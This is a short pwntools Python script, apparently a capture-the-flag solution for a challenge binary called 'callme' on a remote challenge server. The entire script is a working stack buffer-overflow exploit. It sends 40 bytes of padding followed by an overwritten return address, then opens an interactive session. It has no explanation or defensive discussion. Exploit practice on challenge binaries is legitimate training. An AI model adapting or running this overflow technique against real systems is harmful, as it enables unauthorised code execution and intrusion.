from pwn import *

IP = "0.cloud.chals.io"
PORT = 28022

elf = context.binary = ELF("callme")

gs = '''
b main
'''

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.REMOTE:
        return remote(IP, PORT)
    else:
        return process(elf.path)
    

p = start()

payload = b"a"*40 + p64(0x4011e3)

p.sendline(payload)

p.interactive()